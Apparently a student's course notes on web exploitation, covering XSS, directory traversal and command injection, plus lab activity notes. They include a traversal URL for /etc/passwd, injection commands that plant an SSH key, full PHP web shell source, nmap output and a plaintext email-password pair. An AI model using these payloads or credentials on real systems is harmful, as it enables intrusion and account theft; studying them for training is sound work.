
Day 2
====================WEB EXPLOITATION PT 1======================

Web exploitation is extra useful because it attacks easily accessible public facing websites. 


Web fundamentals.

house:
HTML is the foundation
css is the paint/decoration
javascript is allowed to make changes to the house. 


HTTP methods:
    
    get: requesting info from the webserver.
    post: opposite of get, sending info to the server.
    
    
error codes:
1xx - info
2xx - success
3xx - redirection
4xx - client side error
5xx - server side error

x04 - not found

DEMO:
    <web server>/robots.txt
        tells me what user agents are allowed to do certain activities.
        
    find robots.txt either by navigating to it in web browser, with nikto, or nse scripts.

    
    javascript:
        look at it to understand what's happening...
        enclosed in <script> html tags.
        
    nikto... stomp stomp
    


===========XSS============

form of attack when untrusted javascript is injected into a trusted website.

Browser will execute malicious javascript


reflected and stored XSS:
    stored:
        the malicious script is stored on the web server
        persistant
    reflected:
        not stored on web server. Coule be in the URL, (obfuscated with tiny url or base64,) 
        not persistant
        
    DEMO:
        on message board demo site,
        enter message:
            <script>"hello"</script>
            This is a stored script.
            
            we could upload cookie stealer with this same idea >:)
            
            *Server Side injection*
        

directory traversal
    putting things like ../../.. into the url to access different files on the webserver.

    Example from activities:
        http://localhost:31911/books_pick.php?book=?../../../../../../../../etc/passwd
        *question mark before path*
            
    
command injection
    injecting a command into something in a website.
    do something that will finish a command like a ; or a && and then add another command.
   
   

ssh key upload
    www-data is the admin for http server
    ssh-keygen -t rsa
        *get ssh key
    cat ~/.ssh/id_rsa.pub
        *new public key
    
    now do a command injection on the web server to make ssh directory:
        ; mkdir /var/www/.ssh
    
    now do a command injection again to add your key to authorized keys:
        ; echo "<full key>" >> /var/www/.ssh/authorized_keys
        ; cat /var/www/.ssh/authorized_keys
            **just to make sure
    now we can just ssh in.
    

    
    
    
malicious file upload:

    script to upload:
        
      <HTML><BODY>
      <FORM METHOD="GET" NAME="myform" ACTION="">
      <INPUT TYPE="text" NAME="cmd">
      <INPUT TYPE="submit" VALUE="Send">
      </FORM>
      <pre>
      <?php
      if($_GET['cmd']) {
        system($_GET['cmd']);
        }
      ?>
      </pre>
      </BODY></HTML>

    ** save it as a .php

        upload it to the site.
        then navigate to that file in the website
        now we can basically do anything with this shell.
        
    



ACTIVITY NOTES:

jb: 10.50.34.91

T1
Hostname: Donovian_MI_websvr
IP: 10.100.28.40
OS: unknown
Creds:unknown
Last Known SSH Port: unknown
PSP: Unknown
Malware: Unknown
Action: Conduct approved Web Exploitation techniques to collect intellegence.





Nmap scan report for 10.100.28.40
Host is up (0.0013s latency).
Not shown: 9998 closed ports
PORT     STATE SERVICE
80/tcp   open  http
4444/tcp open  krb524


directories /net_test

| http-enum: 
|   /robots.txt: Robots file
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'

/TT/ticket.php

message contains ip address to make certs:
http://10.100.28.55/

from /etc/passwd:
www-data:x:33:33:www-data:/var/www:/bin/bash




email: jolin96850@larland.com
Pass:  Andrew21360















